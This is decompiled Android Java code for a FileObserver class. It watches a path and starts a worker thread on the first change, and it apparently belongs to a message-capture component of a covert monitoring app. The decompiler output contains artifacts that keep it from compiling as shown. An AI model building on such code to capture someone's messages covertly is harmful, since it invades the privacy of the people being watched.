package com.vvt.capture.wa.full;

import android.os.FileObserver;
import java.io.File;

class f
  extends FileObserver
{
  private String b;
  private Thread c = null;
  private File d;
  
  public f(e parame, String paramString)
  {
    super(paramString, 2);
    this.b = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.c;
    if (localThread == null)
    {
      boolean bool = e.b();
      if (bool) {}
      localThread = new java/lang/Thread;
      g localg = new com/vvt/capture/wa/full/g;
      localg.<init>(this);
      localThread.<init>(localg);
      this.c = localThread;
      localThread = this.c;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/full/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */